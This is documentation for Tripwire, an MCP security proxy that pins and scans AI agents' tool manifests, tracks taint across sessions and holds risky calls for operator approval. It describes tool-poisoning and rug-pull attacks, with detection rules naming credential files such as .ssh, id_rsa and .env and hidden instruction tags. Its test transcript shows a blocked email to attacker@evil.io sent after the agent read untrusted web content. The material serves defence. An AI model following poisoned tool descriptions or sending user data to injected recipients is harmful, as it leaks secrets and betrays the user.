# MCP proxy

Tripwire can sit between an MCP client (Claude Desktop, Claude Code, Cursor, the MCP Inspector, your own agent) and the MCP servers it uses. The client connects to Tripwire only; Tripwire connects to each upstream server, shows the client a vetted, namespaced tool list, and runs every tool call and result through the policy engine.

```
agent ──MCP──► Tripwire /v1/mcp ──MCP──► email, files, web, bank, ... (upstreams)
               │ manifest guard   (pin, poisoning scan, shadowing, quarantine)
               │ check/call       (taint labels, policy: allow / block / redact / require_approval)
               │ approval wait    (held call, operator decides, 120 s timeout)
               │ check/result     (injection, secrets, PII; redacted content back)
```

Built on the MCP Python SDK v2 (`mcp>=2.3,<3`): a low-level `Server` faces the agent, one SDK `Client` per upstream. Code: `gateway/src/tripwire/proxy/`, `gateway/src/tripwire/pipeline/manifest.py`, `gateway/src/tripwire/approvals/service.py`.

## Quick start (compose stack)

```bash
make dev        # postgres, redis, mock-mcp, gateway, web
docker compose exec gateway tripwire keys create --name my-agent                 # agent key
docker compose exec gateway tripwire keys create --name me --role operator       # operator key
```

The compose stack proxies the six mock servers (`email`, `files`, `web`, `bank`, `calculator`, `weather`) from `gateway/mcp/upstreams.docker.yaml`.

## Connecting a client

Replace `tw_...` with an **agent** key. Never give an agent an operator key: operator keys can approve held calls.

**Clients that support remote (Streamable HTTP) servers** (Claude Code, Cursor, VS Code, the Inspector). Claude Code `.mcp.json`, or `claude mcp add --transport http tripwire http://localhost:8000/v1/mcp --header "Authorization: Bearer tw_..."`:

```json
{
  "mcpServers": {
    "tripwire": {
      "type": "http",
      "url": "http://localhost:8000/v1/mcp",
      "headers": { "Authorization": "Bearer tw_..." }
    }
  }
}
```

**Claude Desktop and other stdio-only clients.** `claude_desktop_config.json` (macOS: `~/Library/Application Support/Claude/`), using the running compose stack:

```json
{
  "mcpServers": {
    "tripwire": {
      "command": "docker",
      "args": [
        "compose", "-f", "/ABSOLUTE/PATH/TO/tripwire/docker-compose.yml",
        "exec", "-T", "-e", "TRIPWIRE_API_KEY=tw_...",
        "gateway", "tripwire", "mcp", "stdio"
      ]
    }
  }
}
```

Or without Docker for the bridge (needs `uv`; the gateway itself still runs in compose):

```json
{
  "mcpServers": {
    "tripwire": {
      "command": "uv",
      "args": ["run", "--directory", "/ABSOLUTE/PATH/TO/tripwire/gateway", "tripwire", "mcp", "stdio"],
      "env": {
        "TRIPWIRE_API_KEY": "tw_...",
        "TRIPWIRE_URL": "http://localhost:8000",
        "TRIPWIRE_USER_PROMPT": ""
      }
    }
  }
}
```

`tripwire mcp stdio` is a thin bridge: it creates one Tripwire session per process and forwards to `TRIPWIRE_URL/v1/mcp`, so guard, policies, approvals and the audit trail stay in the gateway. Claude Desktop restarts it with the app.

What was tested (2026-11-27): the HTTP config with the official MCP Inspector (below) and the SDK client; the Docker stdio config by launching that exact command with the SDK's stdio client (the way Claude Desktop launches servers: it listed the 7 visible tools and completed a call over protocol 2026-07-28); the `uv` stdio bridge in the integration tests (`test_stdio_bridge_like_a_desktop_client`). The Claude Desktop GUI itself was not driven.

## Sessions

Tripwire's taint tracking needs to know which calls belong to one agent run:

1. `X-Tripwire-Session: <uuid>` (a session created with `POST /v1/sessions` by the same key) puts the call in that session. The stdio bridge does this; use it for per-run isolation.
2. Otherwise all MCP traffic of an API key shares **one rolling session** (stored in Redis, renewed on use, replaced after 1 h idle). The MCP connection is deliberately not the boundary: a client that reconnects between reading untrusted content and acting on it must not get a clean taint context. (The MCP Inspector CLI opens a new connection for every command; the block in the transcript below depends on this.)

`X-Tripwire-User-Prompt` (percent-encoded; `TRIPWIRE_USER_PROMPT` for the bridge) seeds a new session's user prompt, so recipients and accounts the user named are trusted (instruction origin).

## Upstreams

`TRIPWIRE_MCP_UPSTREAMS` (default `mcp/upstreams.yaml`; example in `gateway/mcp/upstreams.example.yaml`):

```yaml
upstreams:
  github:
    url: "https://api.githubcopilot.com/mcp/"
    headers: {Authorization: "Bearer ${GITHUB_TOKEN}"}   # ${VAR} from the gateway's env
  filesystem:
    command: "npx"
    args: ["-y", "@modelcontextprotocol/server-filesystem", "/data"]
```

The name becomes the namespace (`github__create_issue`) and may not contain `__`. Every tools/list is fetched fresh from every upstream (the SDK's list cache is bypassed, or a rug pull could go unseen); an unreachable upstream lists no tools until it is back. Tool calls are never retried.

## Manifest security

Each tool's *manifest* is its name, description and input schema.

| Check | How | Result |
|---|---|---|
| Pinning | SHA-256 over canonical JSON of namespaced name + description + input schema, stored in `tool_pins` on first sight | — |
| Rug pull | Hash differs from the pin | Tool hidden and calls blocked; `tool_change` review with a unified diff (before/after) and a scan of the new version |
| Poisoning | Every description (tool and each parameter, any depth) through heuristics + classifier under the corroborated rule, plus manifest rules: `sensitive-path` (.env, .ssh, id_rsa, cloud credentials, MCP client configs), `hidden-unicode`, `html-comment`, `instruction-tag` (`<IMPORTANT>`…), `pass-data-as-argument`, `call-other-tool-first`, `hide-from-user`, `redirect-other-tools` | Score ≥ 0.5: quarantined, `tool_quarantine` review |
| Shadowing | Bare name within Levenshtein distance 2 (rapidfuzz) of a tool on another server, or a description naming another server's tool (namespaced, or a bare name of 5+ characters) | Quarantined. First seen wins: an already pinned tool is not re-scanned when a look-alike appears |

Only `pinned` tools are listed, and only they can be called. A changed tool stays blocked even if the server switches back to the old description, until an operator decides. Reviews never expire on the 120 s clock.

Operator review: `GET /v1/approvals?status=pending` (kinds `tool_quarantine`, `tool_change`), then `POST /v1/approvals/{id}` with `{"decision": "approve"}`, or `POST /v1/tools/{name}/approve` to re-pin the latest manifest directly. `GET /v1/tools` lists every pin with status, risk score and findings.

The mock `calculator` (poisoned `add`) scores 0.97 (`sensitive-path`, `pass-data-as-argument`, `hide-from-user`, `instruction-tag`, `call-other-tool-first`); the other mock tools score 0; `weather`'s rug-pulled description scores 0.90.

## Approvals

When a decision is `require_approval`, the proxy holds the call:

1. an `approvals` row (`kind: call`, the arguments, rule and message) is created and an `approval.created` event is published on `/v1/stream`;
2. the call waits up to `TRIPWIRE_APPROVAL_TIMEOUT_S` (120 s). Clients that asked for progress get a progress notification every 5 s, which keeps clients that reset their timeout on progress waiting;
3. an operator decides with `POST /v1/approvals/{id}` `{"decision": "approve" | "deny", "scope": "once" | "session"}`. `session` allows later calls to the same tool in the same session without asking;
4. approved: the call goes to the upstream and the result is checked as usual. Denied or timed out (status `expired`): the agent gets a tool error.

Deciding needs an **operator** key (`tripwire keys create --role operator`); agent keys get 403, so an agent cannot approve its own held calls. Agent keys may read (`GET /v1/approvals/{id}`) approvals of their own sessions. Postgres is the source of truth; waiters are woken in-process or by polling once a second, so any worker can decide any approval.

`WS /v1/stream` with `Authorization: Bearer <operator key>` streams `{"type": "approval.created" | "approval.decided", "approval": {...}}`. (Browser auth for the console comes with the web app.)

## What the agent sees

| Situation | MCP result |
|---|---|
| allowed | upstream content after `check/result` (secrets redacted, `[REDACTED:<kind>]`) |
| `block` | `isError: true`, `Blocked by Tripwire (<rule id>): <rule message>` |
| held, denied | `isError: true`, `An operator denied this call (approval <id>).` |
| held, timed out | `isError: true`, `No operator approved this call within 120 s, so it was denied (approval <id>).` |
| quarantined / changed tool | not listed; calling it: `isError: true` with the reason |
| upstream failure, or any internal error | `isError: true`, fail closed |

Non-text content (images, audio, resources) cannot be vetted and is replaced by a placeholder. Output schemas and structured content are not forwarded (results are returned as text).

## Manual check with the MCP Inspector (2026-11-27)

Compose stack up, fresh pins, new agent key. Official Inspector (`@modelcontextprotocol/inspector`, CLI mode, Streamable HTTP). Each command is a separate connection; tool lists are shortened to names.

```
$ npx @modelcontextprotocol/inspector --cli http://localhost:8000/v1/mcp --transport http --header "Authorization: Bearer tw_…" --method tools/list   # tool names shown
['email__read_inbox', 'email__send_email', 'files__read_file', 'files__write_file', 'web__fetch', 'bank__get_balance', 'bank__transfer', 'weather__get_forecast']

$ ... --method tools/call --tool-name weather__get_forecast --tool-arg city=Pune
{
  "content": [
    {
      "type": "text",
      "text": "Pune: 18°C, light rain in the afternoon."
    }
  ],
  "isError": false
}

$ ... --method tools/list   # second listing, tool names shown
['email__read_inbox', 'email__send_email', 'files__read_file', 'files__write_file', 'web__fetch', 'bank__get_balance', 'bank__transfer']

$ ... --method tools/call --tool-name web__fetch --tool-arg url=https://news.example.org/bike-lanes
{
  "content": [
    {
      "type": "text",
      "text": "City council approves new bike lanes. Construction starts in March."
    }
  ],
  "isError": false
}

$ ... --method tools/call --tool-name email__send_email --tool-arg to=attacker@evil.io --tool-arg subject=hi --tool-arg body=x
{
  "content": [
    {
      "type": "text",
      "text": "Blocked by Tripwire (no-untrusted-recipient): The recipient address came from untrusted content, not from you."
    }
  ],
  "isError": true
}
{"error":{"code":"tool_is_error","message":"Tool 'email__send_email' returned isError:true."}}
```

1. The first listing shows 8 namespaced tools; `calculator__add` is absent (quarantined).
2. `weather__get_forecast` works once; the mock then changes its description, and the second listing no longer contains it (rug pull, `tool_change` review opened with the diff).
3. After fetching an untrusted page, an email to an address that came from nowhere the user named is blocked with the rule's message, even though each Inspector command is a new connection. (The Inspector also prints its own `tool_is_error` line after an `isError` result.)

To use the Inspector UI instead: `npx @modelcontextprotocol/inspector`, transport "Streamable HTTP", URL `http://localhost:8000/v1/mcp`, add the header `Authorization: Bearer tw_...` under Authentication. Its request-timeout settings can be shorter than an approval wait (up to 120 s); raise them (Configuration) to try held calls in the UI. Tripwire sends a progress notification every 5 s while a call is held.

## Latency

See [performance.md](performance.md#mcp-proxy-overhead).
